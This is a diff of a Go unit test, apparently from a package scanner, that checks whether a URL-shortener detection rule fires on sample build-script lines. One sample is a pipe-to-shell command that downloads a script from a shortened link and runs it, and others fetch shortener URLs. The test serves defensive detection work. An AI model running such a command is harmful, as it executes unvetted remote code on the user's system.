@@ -22,7 +22,7 @@ func TestURLShortenerNeedsAHostBoundary(t *testing.T) {
 	}
 	for _, line := range []string{
 		`curl -sL https://bit.ly/3xAbC | sh`,
-		`url = "http://tinyurl.com/api-create.php?url="`,
+		`urllib.request.urlopen("http://tinyurl.com/y2uuvskb")`, // a shortener's own API is not (audit_text2_fp_test.go)
 		`fetch("https://t.co/abc123")`,
 	} {
 		if f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}); !fires(f, "P-URL-SHORTENER") {
